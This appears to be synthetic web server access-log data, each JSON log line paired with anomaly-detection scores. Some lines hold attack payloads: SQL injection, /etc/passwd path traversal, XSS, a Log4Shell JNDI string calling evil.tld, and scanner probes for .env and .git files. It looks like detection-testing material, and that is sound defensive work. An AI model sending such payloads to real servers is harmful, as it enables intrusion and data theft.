score_content,score_session,score_fused,line
5.853091716766357,,5.853091716766357,{"remote_addr": "52.159.160.117", "time_local": "11/Jan/2025:09:01:07 -0700", "request": "GET /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 11183, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
118.27182006835938,,118.27182006835938,{"remote_addr": "128.56.52.157", "time_local": "11/Jan/2025:09:01:07 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 404, "body_bytes_sent": 59, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
52.700809478759766,,52.700809478759766,{"remote_addr": "56.28.48.65", "time_local": "11/Jan/2025:09:01:08 -0700", "request": "HEAD /search?q=router HTTP/2", "status": 301, "body_bytes_sent": 9965, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
50.6723518371582,,50.6723518371582,{"remote_addr": "6.188.137.33", "time_local": "11/Jan/2025:09:01:09 -0700", "request": "HEAD /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 15004, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
71.91558837890625,,71.91558837890625,{"remote_addr": "152.183.13.20", "time_local": "11/Jan/2025:09:01:09 -0700", "request": "OPTIONS /admin HTTP/2", "status": 200, "body_bytes_sent": 17936, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
25.308143615722656,,25.308143615722656,{"remote_addr": "250.144.178.15", "time_local": "11/Jan/2025:09:01:10 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 201, "body_bytes_sent": 3566, "http_referer": "-", "http_user_agent": "dirb/2.22"}
16.972322463989258,,16.972322463989258,{"remote_addr": "73.173.67.196", "time_local": "11/Jan/2025:09:01:10 -0700", "request": "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 15235, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
3.0450570583343506,,3.0450570583343506,{"remote_addr": "135.13.17.36", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "POST /.git/config HTTP/2", "status": 200, "body_bytes_sent": 15271, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
71.85345458984375,,71.85345458984375,{"remote_addr": "121.84.226.10", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "OPTIONS /logout HTTP/2", "status": 200, "body_bytes_sent": 661, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
26.770763397216797,,26.770763397216797,{"remote_addr": "77.211.124.173", "time_local": "11/Jan/2025:09:01:11 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 12200, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
71.87947845458984,,71.87947845458984,{"remote_addr": "90.254.161.150", "time_local": "11/Jan/2025:09:01:12 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 6304, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
4.347161293029785,,4.347161293029785,{"remote_addr": "156.171.91.211", "time_local": "11/Jan/2025:09:01:12 -0700", "request": "POST /contact HTTP/2", "status": 204, "body_bytes_sent": 11007, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
26.776897430419922,,26.776897430419922,{"remote_addr": "182.119.60.175", "time_local": "11/Jan/2025:09:01:13 -0700", "request": "DELETE /contact HTTP/2", "status": 200, "body_bytes_sent": 14263, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
0.27381184697151184,,0.27381184697151184,{"remote_addr": "100.2.45.29", "time_local": "11/Jan/2025:09:01:14 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 12198, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
4.3975653648376465,,4.3975653648376465,{"remote_addr": "146.146.48.55", "time_local": "11/Jan/2025:09:01:15 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 14285, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
107.03569793701172,,107.03569793701172,{"remote_addr": "31.104.197.101", "time_local": "11/Jan/2025:09:01:15 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7096, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
5.835331916809082,,5.835331916809082,{"remote_addr": "218.231.56.164", "time_local": "11/Jan/2025:09:01:16 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 9972, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
15.508255004882812,,15.508255004882812,{"remote_addr": "170.32.45.118", "time_local": "11/Jan/2025:09:01:16 -0700", "request": "POST /login HTTP/2", "status": 404, "body_bytes_sent": 560, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
13.707919120788574,,13.707919120788574,{"remote_addr": "159.30.7.203", "time_local": "11/Jan/2025:09:01:17 -0700", "request": "PUT /.env HTTP/2", "status": 304, "body_bytes_sent": 14551, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
4.622522354125977,,4.622522354125977,{"remote_addr": "9.28.11.10", "time_local": "11/Jan/2025:09:01:18 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 17305, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.5555706024169922,,1.5555706024169922,{"remote_addr": "180.192.241.57", "time_local": "11/Jan/2025:09:01:19 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 6120, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
102.8608627319336,,102.8608627319336,{"remote_addr": "241.168.33.46", "time_local": "11/Jan/2025:09:01:20 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 11750, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
2.269599437713623,,2.269599437713623,{"remote_addr": "78.52.19.216", "time_local": "11/Jan/2025:09:01:20 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 12552, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
8.526062965393066,,8.526062965393066,{"remote_addr": "76.149.44.200", "time_local": "11/Jan/2025:09:01:21 -0700", "request": "POST /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 3070, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
33.00303649902344,,33.00303649902344,{"remote_addr": "15.75.189.113", "time_local": "11/Jan/2025:09:01:22 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 301, "body_bytes_sent": 16173, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
107.05354309082031,,107.05354309082031,{"remote_addr": "84.218.112.159", "time_local": "11/Jan/2025:09:01:23 -0700", "request": "TRACE /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 12654, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
52.704463958740234,,52.704463958740234,{"remote_addr": "66.113.105.41", "time_local": "11/Jan/2025:09:01:24 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 302, "body_bytes_sent": 1198, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
569.4280395507812,,569.4280395507812,{"remote_addr": "67.138.18.122", "time_local": "11/Jan/2025:09:01:24 -0700", "request": "GET /logout HTTP/2", "status": 500, "body_bytes_sent": 884, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
46.523372650146484,,46.523372650146484,{"remote_addr": "104.215.87.64", "time_local": "11/Jan/2025:09:01:25 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 8541, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
70.330322265625,,70.330322265625,{"remote_addr": "124.142.80.7", "time_local": "11/Jan/2025:09:01:25 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 15731, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
28.816186904907227,,28.816186904907227,{"remote_addr": "95.128.25.38", "time_local": "11/Jan/2025:09:01:26 -0700", "request": "DELETE /profile HTTP/2", "status": 302, "body_bytes_sent": 7730, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
102.80754089355469,,102.80754089355469,{"remote_addr": "174.181.221.213", "time_local": "11/Jan/2025:09:01:26 -0700", "request": "TRACE /dashboard HTTP/2", "status": 200, "body_bytes_sent": 13440, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
45.1435432434082,,45.1435432434082,{"remote_addr": "194.240.128.157", "time_local": "11/Jan/2025:09:01:27 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 2488, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
50.76179122924805,,50.76179122924805,{"remote_addr": "251.213.87.181", "time_local": "11/Jan/2025:09:01:28 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 10172, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
25.473255157470703,,25.473255157470703,{"remote_addr": "90.17.79.171", "time_local": "11/Jan/2025:09:01:28 -0700", "request": "DELETE /index.html HTTP/2", "status": 200, "body_bytes_sent": 12045, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.6474215984344482,,1.6474215984344482,{"remote_addr": "127.220.139.40", "time_local": "11/Jan/2025:09:01:29 -0700", "request": "GET /profile HTTP/2", "status": 204, "body_bytes_sent": 15794, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
0.24999932944774628,,0.24999932944774628,{"remote_addr": "189.55.83.217", "time_local": "11/Jan/2025:09:01:29 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11507, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.31835174560547,,70.31835174560547,{"remote_addr": "68.79.50.240", "time_local": "11/Jan/2025:09:01:30 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 11661, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
10.584827423095703,,10.584827423095703,{"remote_addr": "221.8.238.117", "time_local": "11/Jan/2025:09:01:31 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 301, "body_bytes_sent": 6904, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
16.838666915893555,,16.838666915893555,{"remote_addr": "39.84.194.77", "time_local": "11/Jan/2025:09:01:31 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 1032, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
12.794363975524902,,12.794363975524902,{"remote_addr": "19.232.133.65", "time_local": "11/Jan/2025:09:01:32 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 10844, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
8.525635719299316,,8.525635719299316,{"remote_addr": "125.30.107.222", "time_local": "11/Jan/2025:09:01:32 -0700", "request": "POST /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 2853, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
107.05400848388672,,107.05400848388672,{"remote_addr": "59.150.119.171", "time_local": "11/Jan/2025:09:01:33 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 12814, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
102.7008285522461,,102.7008285522461,{"remote_addr": "173.146.97.143", "time_local": "11/Jan/2025:09:01:33 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 475, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
0.21765074133872986,,0.21765074133872986,{"remote_addr": "232.33.210.120", "time_local": "11/Jan/2025:09:01:34 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 13717, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
2.3090903759002686,,2.3090903759002686,{"remote_addr": "63.178.179.223", "time_local": "11/Jan/2025:09:01:35 -0700", "request": "GET /assets/app.css HTTP/2", "status": 302, "body_bytes_sent": 12681, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
2.3078227043151855,,2.3078227043151855,{"remote_addr": "201.139.29.171", "time_local": "11/Jan/2025:09:01:35 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 5949, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
61.708927154541016,,61.708927154541016,{"remote_addr": "168.21.76.136", "time_local": "11/Jan/2025:09:01:36 -0700", "request": "HEAD /search?q=laptop HTTP/2", "status": 403, "body_bytes_sent": 1170, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
106.99433898925781,,106.99433898925781,{"remote_addr": "164.176.105.24", "time_local": "11/Jan/2025:09:01:37 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 15221, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
102.90316772460938,,102.90316772460938,{"remote_addr": "127.63.220.240", "time_local": "11/Jan/2025:09:01:37 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 5422, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.360965251922607,,4.360965251922607,{"remote_addr": "100.108.120.182", "time_local": "11/Jan/2025:09:01:39 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 12504, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
4.292828559875488,,4.292828559875488,{"remote_addr": "189.2.78.233", "time_local": "11/Jan/2025:09:01:39 -0700", "request": "POST /dashboard HTTP/2", "status": 200, "body_bytes_sent": 9498, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
78.11656188964844,,78.11656188964844,{"remote_addr": "193.161.203.214", "time_local": "11/Jan/2025:09:01:40 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 304, "body_bytes_sent": 5781, "http_referer": "-", "http_user_agent": "dirb/2.22"}
4.328495502471924,,4.328495502471924,{"remote_addr": "63.99.105.40", "time_local": "11/Jan/2025:09:01:41 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 2561, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
5.903974533081055,,5.903974533081055,{"remote_addr": "85.237.34.142", "time_local": "11/Jan/2025:09:01:42 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 11123, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.278955936431885,,4.278955936431885,{"remote_addr": "138.227.41.201", "time_local": "11/Jan/2025:09:01:43 -0700", "request": "POST /api/products HTTP/2", "status": 200, "body_bytes_sent": 8677, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
11.444172859191895,,11.444172859191895,{"remote_addr": "39.231.48.170", "time_local": "11/Jan/2025:09:01:44 -0700", "request": "PUT /index.html HTTP/2", "status": 200, "body_bytes_sent": 14623, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
29.10645866394043,,29.10645866394043,{"remote_addr": "89.24.136.198", "time_local": "11/Jan/2025:09:01:45 -0700", "request": "DELETE / HTTP/2", "status": 304, "body_bytes_sent": 13933, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
12.81235408782959,,12.81235408782959,{"remote_addr": "14.31.201.85", "time_local": "11/Jan/2025:09:01:45 -0700", "request": "PUT /login HTTP/2", "status": 200, "body_bytes_sent": 16994, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
102.76873016357422,,102.76873016357422,{"remote_addr": "140.152.200.167", "time_local": "11/Jan/2025:09:01:46 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 9745, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
16.909320831298828,,16.909320831298828,{"remote_addr": "214.129.95.226", "time_local": "11/Jan/2025:09:01:47 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 871, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
15.602682113647461,,15.602682113647461,{"remote_addr": "180.195.10.105", "time_local": "11/Jan/2025:09:01:47 -0700", "request": "POST / HTTP/2", "status": 401, "body_bytes_sent": 1038, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
8.613320350646973,,8.613320350646973,{"remote_addr": "227.235.156.61", "time_local": "11/Jan/2025:09:01:48 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 9581, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
50.664493560791016,,50.664493560791016,{"remote_addr": "209.134.67.118", "time_local": "11/Jan/2025:09:01:49 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 12338, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
573.6928100585938,,573.6928100585938,{"remote_addr": "216.178.25.216", "time_local": "11/Jan/2025:09:01:49 -0700", "request": "GET /search?q=router HTTP/2", "status": 503, "body_bytes_sent": 1163, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
